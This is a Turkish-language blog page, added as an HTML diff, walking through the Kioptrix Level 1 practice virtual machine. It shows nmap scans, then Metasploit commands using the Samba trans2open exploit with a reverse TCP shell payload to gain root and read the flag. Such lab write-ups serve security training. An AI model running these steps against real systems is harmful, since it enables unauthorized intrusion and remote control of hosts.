@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <!-- meta information -->
+<meta charset="utf-8">
+<meta name="description" 
+      content="      Kioptrix, içerisindeki çeşitli zafiyetleri istismar ettiğimiz, bunlar sayesinde erişimler elde edebildiğimiz ve..." >
+<meta name="author" content="7122016">
+
+<!-- Enable responsiveness on mobile devices-->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+<!-- title -->
+<title>Kioptrix Level 1 Çözüm &middot; </title>
+
+<!-- icons -->
+<link rel="shortcut icon" href="/public/images/favicon.ico" />
+
+<!-- stylesheets -->
+<link rel="stylesheet" href="/public/css/responsive.gs.12col.css">
+<link rel="stylesheet" href="/public/css/animate.min.css">
+<link rel="stylesheet" href="/public/css/main.css">
+
+<!-- Google fonts -->
+<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700,400italic&subset=latin-ext">
+
+
+
+<!-- feed links -->
+<link rel="alternate" href="http://localhost:4000/feed.xml" type="application/rss+xml" title="">
+
+  </head>
+  <body>
+    <div class="container azul">
+      <header class="top row gutters">
+        <div class="col span_2 center">
+          <!-- TODO: add baseurl to the logo link -->
+          <a href="http://localhost:4000" id="logo" title="7122016"
+             style="background-image: url(/public/images/);"></a>
+        </div>
+        <nav class="col span_10 top-navbar">
+  
+  <a href="/" title="Anasayfa"
+     >Anasayfa</a>
+  
+  <a href="/iletisim.html" title="Hakkında"
+     >Hakkında</a>
+  
+</nav>
+
+      </header>
+      <h2><center>Gönderiler</center></h2>
+      <article class="single row gutters">
+  <time class="published" datetime="2017-04-26">26 April 2017</time>
+  <h2>Kioptrix Level 1 Çözüm</h2>
+
+  <p>      <strong>Kioptrix</strong>, içerisindeki çeşitli zafiyetleri istismar ettiğimiz, bunlar sayesinde erişimler elde 
+edebildiğimiz ve bu şekilde sistemi ele geçirmeye çalıştığımız bir sanal makine uygulamasıdır.
+Bu yazımızda Kioptrix <strong>Level 1</strong> sanal makinesi çözümünü yapacağız. Sanal makineyi <a href="http://www.kioptrix.com/blog/test-page/">şu</a> bağlantı 
+üzerinden indirebilirsiniz.</p>
+
+<p>      Öncelikle sanal makinenın ağ üzerinde hangi ip adresini aldığını öğrenmek için <strong>nmap</strong> aracıyla
+genel bir ağ taraması yapıyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>nmap -sV -T4 192.168.0.0/24
+</code></pre>
+</div>
+
+<p><img src="/img/kioptrix/hedef-tespiti.png" /></p>
+
+<p>      Bu ağ taraması sonucuna göre Kioptrix Level 1 sanal makinasının aldığı ip adresi 192.168.0.22 olarak
+görünüyor. Bu bilgiyi kullanarak şimdi açık portları tespit etmek için başka bir tarama yapacağız.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>nmap -sV -T4 192.168.0.22 --open
+</code></pre>
+</div>
+
+<p><img src="/img/kioptrix/hedef-tarama.png" /></p>
+
+<p>      Bu işlem sonucunda açık olan portları aşağıdaki gibi listeliyoruz.  <strong>Netbios-ssn</strong> servisi
+üzerinden işlem yapmaya çalışacağız. Burada sambanın bu sürümünde bulunan <strong>arabellek taşması(buffer overflow)</strong>
+açığı istismar edilecektir.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>139/tcp</td>
+      <td>open</td>
+      <td>netbios-ssn</td>
+      <td>Samba smbd (workgroup: MYGROUP)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>      <strong>Metasploit Framework</strong> üzerinde <strong>exploit</strong> aramaya başlıyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>msf&gt; search samba
+</code></pre>
+</div>
+
+<p><img src="/img/kioptrix/search-exploit.jpeg" /></p>
+
+<p>      Burada listelenen çözümlerden sistemimiz ile ilgili olan seçiyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>msf&gt;  use exploit/linux/samba/trans2open
+</code></pre>
+</div>
+
+<p>      Bu aşamada kullandığımız exploit sayesinde samba servisi açığından yararlanabiliyoruz fakat
+hedef sistem üzerinde bir kontrol elde edemiyoruz. Burada hedef sisteme sızmayı sağlayan ve 
+istediğimiz işlemleri gerçekleştirmemizi sağlayan <strong>payload</strong>lardan birini kullanmamız gerekiyor.
+Uygun olabilecek payloadları aratıyoruz ve buradan <strong>reverse_tcp</strong> seçimini yapıp hedefe karşı bir
+reverse shell uygulaması yapacağız. Hedefin tepkisi sonucu terminalden bir reverse shell bağlantısı
+kurulacak. Sonrasında eklememiz gereken parametreleri görmek ve eklemek için aşağıdaki adımları
+uyguluyoruz.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>msf&gt; show payloads
+msf&gt; set PAYLOAD generic/shell_reverse_tcp
+msf&gt; options
+msf&gt; set RHOST 192.168.0.18
+msf&gt; set LHOST 192.168.0.14
+msf&gt; run
+</code></pre>
+</div>
+
+<p><img src="/img/kioptrix/search-payload.jpeg" /></p>
+
+<p><img src="/img/kioptrix/options.jpeg" /></p>
+
+<p><img src="/img/kioptrix/root-erisim.jpeg" /></p>
+
+<p>      Belli bir süre devam eden işlem sonucunda hedefe root erişimi sağlıyoruz. Artık içeride 
+bulunmak istenen mesajı aramaya başlıyoruz. Önemli gördüğümüz dizinler arasında dolanırken
+gözümüze <strong>var</strong> dizini takılıyor . Buraya girdiğmizde <strong>mail</strong> adlı bir dosya daha görüyoruz. Bunun da
+içerisine girdiğmizde dosya tipi <strong>ASCII mail text</strong> olan ‘<strong>root</strong>’ adlı bir dosya görüyoruz. Bunu 
+okuduğumuzda bu  makinenin <strong>FLAG</strong> değerine ulaşıyoruz.</p>
+
+<p><img src="/img/kioptrix/sonuc1.jpeg" />
+<img src="/img/kioptrix/sonuc2.jpeg" /></p>
+
+
+</article>
+
+
+      <footer>
+        <p>
+          Tüm hakları <a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/deed.en_US">Creative Commons Attribution-NonCommercial 4.0 International License</a>.
+	altında saklıdır.     
+   </p>
+      </footer>
+    </div>
+
+    <!-- scripts -->
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+    <script src="/public/js/jquery.fitvids.js"></script>
+    <script>
+      $(document).ready(function(){
+        $("article").fitVids();
+      });
+    </script>
+  </body>
+</html>
